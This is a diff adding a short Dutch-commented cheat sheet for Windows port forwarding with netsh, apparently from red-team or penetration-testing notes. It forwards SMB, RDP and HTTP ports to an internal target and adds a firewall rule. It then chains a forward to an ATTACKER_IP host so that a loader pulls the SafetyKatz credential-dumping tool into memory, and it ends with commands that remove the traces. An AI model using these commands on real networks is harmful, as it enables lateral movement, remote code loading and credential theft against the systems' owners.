@@ -1,0 +1,21 @@
+# Windows Port Forwarding via netsh (geen extra tools nodig)
+# === Port forward aanmaken ===
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_TARGET
+# === Firewall regel toevoegen ===
+netsh advfirewall firewall add rule name="port_fwd" protocol=TCP dir=in localport=4455 action=allow
+# === Verifieer ===
+netsh interface portproxy show all
+netstat -anp TCP | find "4455"
+# === Meerdere forwards ===
+netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=INTERNAL_TARGET
+netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_TARGET
+# === Port forward + NetLoader chain ===
+# Forward HTTP poort naar aanvaller voor in-memory tool loading:
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=ATTACKER_IP
+# Dan op target: Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+# === Opruimen ===
+netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
+netsh advfirewall firewall delete rule name="port_fwd"
+netsh interface portproxy reset
+# Tip: Vereist SYSTEM/admin privileges
+# Tip: Geen extra tools nodig - ideaal voor restricted environments
